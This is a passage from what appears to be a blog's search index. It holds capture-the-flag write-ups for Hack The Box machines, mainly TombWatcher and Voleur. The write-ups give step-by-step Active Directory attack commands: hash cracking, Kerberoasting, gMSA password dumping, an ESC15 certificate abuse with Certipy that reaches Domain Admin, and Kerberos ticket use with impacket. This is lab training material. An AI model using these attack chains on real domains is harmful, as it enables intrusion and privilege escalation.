hashcat.\nhashcat -m 1800 hash.txt /usr/share/wordlists/rockyou.txt Password obtained!

After a few minutes of searching, I didn’t find anything. The next step I have in mind is to use BloodHound to map the target’s Active Directory structure, identify relationships between users, groups, and permissions, and find potential privilege escalation paths within the domain.

This allows us to perform a Kerberoasting attack to obtain their password hash and escalate privileges within the domain.\nTo do this, we first clone the targetedKerberoast repository.\ngit clone https://github.com/ShutdownRepo/targetedKerberoast.git To perform the attack, we need to be time-synchronized.\nsudo ntpdate tombwatcher.htb In my case, I use ntpdate only to get the target machine’s time, then use faketime, because on Kali the time doesn’t sync properly.

Once Alfred is a member of this group, we gain ReadGMSAPassword permission on the user ANSIBLE_DEV$, which allows us to read the password of their Kerberos-managed account and use it to escalate privileges within the domain.\nWe use bloodyAD instead of net rpc because bloodyAD communicates directly with Active Directory via LDAP or modern RPC and can handle domain permissions that net rpc cannot. It is also more reliable for adding users to groups when net rpc fails due to restrictions or compatibility issues.\nbloodyAD -u \u0026#39;alfred\u0026#39; -p \u0026#39;basketball\u0026#39; -d tombwatcher.htb --dc-ip 10.10.11.72 add groupMember INFRASTRUCTURE alfred\r[+] alfred added to INFRASTRUCTURE The next step is to exploit the ReadGMSAPassword permission, and BloodHound shows us how to perform the attack.\nWe clone the gMSADumper repository to our local machine.\ngit clone https://github.com/micahvandeusen/gMSADumper.git And run the following command:\n./gMSADumper.py -u alfred -p basketball -d tombwatcher.htb With this hash, we can authenticate as ANSIBLE_DEV$ on the domain, whether for pass-the-hash, Kerberos attacks, or privilege escalation to access restricted resources.\nThe next step is to force the Sam user to change their password.

See CVE-2024-49019 or the wiki for more details. The WebServer template has a vulnerability (ESC15) that allows us to create a certificate as if we were another user. This means we could gain access to important accounts, including Domain Admin, and use it to escalate privileges within the domain. Instructions for exploitation: ESC15\nTo exploit the vulnerability, we first request a certificate in the name of the Administrator using Certipy.\ncertipy-ad req -dc-ip 10.10.11.72 -ca tombwatcher-CA-1 -target DC01.tombwatcher.htb -u cert_admin@tombwatcher.htb -p \u0026#39;admin1234\u0026#39; -template WebServer -upn administrator@tombwatcher.htb -application-policies \u0026#39;Client Authentication\u0026#39; This command generates a .pfx file containing the certificate with Administrator privileges.\nNext, we use that certificate to authenticate and open an LDAP session with administrative access.\ncertipy-ad auth -pfx administrator.pfx -dc-ip 10.10.11.72 -ldap-shell This gives us a Domain Admin session, allowing us to control the domain and execute critical actions.\nUsing the help command, we see what actions can be executed.\nWe can change the Administrator user’s password.\nFinally, we obtain the Root Flag and complete the machine!!\n","permalink":"http://localhost:1313/writeups/medium/tombwatcher/","summary":"Difficulty: Medium 🟠","title":"TombWatcher - Hack The Box"},{"content":"\rWe start by performing a quick port scan with Nmap to see which ports are open.\nsudo nmap -sS -p- --min-rate 4500 -n -Pn -vvv 10.10.11.76 Using these ports, we now perform a deeper scan, saving the results to a file called \u0026ldquo;target\u0026rdquo;.\nnmap -sCV -p445,135,139,53,88,49668,389,2222,3268,58816,5985,58833,58815,58828,3269 -n -Pn 10.10.11.76 -oN target We add the domain to the /etc/hosts file so we can resolve both the domain and the domain controller name.\nTo start hacking the machine, we are given some initial credentials.\nryan.naylor : HollowOct31Nyt When trying to enumerate SMB shares with the credentials ryan.naylor:HollowOct31Nyt, authentication fails. This is not because the credentials are wrong, but because the Active Directory server does not allow direct authentication with username and password, it requires Kerberos. In other words, before interacting with SMB, we need a TGT (Ticket Granting Ticket) that proves our identity to the KDC (Key Distribution Center, the central server that issues authentication tickets in the domain).\nTo obtain the TGT, we first synchronize the clock with the domain server, since Kerberos is sensitive to time differences.\nsudo ntpdate voleur.htb Since Kali doesn’t sync directly with the domain server using ntpdate, I used faketime to simulate the correct time in the process of generating the ticket.\nfaketime \u0026#39;YYYY-MM-DD HH:MM:SS\u0026#39; impacket-getTGT voleur.htb/\u0026#39;ryan.naylor\u0026#39;:\u0026#39;HollowOct31Nyt\u0026#39; Then, I exported the generated file to the KRB5CCNAME environment variable.\nexport KRB5CCNAME=$PWD/ryan.naylor.ccache This tells all Kerberos tools (and SMB in our case) to use that ticket instead of attempting to authenticate directly with the password.\nYou can use klist to verify that the ticket was loaded correctly.\nNow, to access the shared resources, instead of smbclient I used impacket-smbclient, as it offers more reliable Kerberos support and allows directly using cached tickets (-k -no-pass).\nfaketime \u0026#34;$(ntpdate -q voleur.htb | awk \u0026#39;{print $1 \u0026#34; \u0026#34; $2}\u0026#39;)\u0026#34; impacket-smbclient -k -no-pass -dc-ip 10.10.11.76 VOLEUR.HTB/ryan.naylor@dc.voleur.htb We found an Excel file that is password protected, so we cannot open it directly.

First, we will use the following command for a quick scan that informs us about the open ports. We will scan all ports (65535) without depth.\nsudo nmap -sS -p- --min-rate 4500 -n -Pn 192.168.18.190 And now, with the open ports identified, we will perform a more detailed scan:\nnmap -sCV -p22,80,6800 -n -Pn 192.168.18.190 -oN target We observe that port 6800 is running Aria2, which is an open-source downloader that supports various protocols such as HTTP, FTP, BitTorrent.\nBy accessing port 80, we obtain the username Carolina.\nUser carolina\rNext, we notice that by selecting \u0026lsquo;By URLs\u0026rsquo; within \u0026lsquo;Add\u0026rsquo;, we can upload files to any directory.
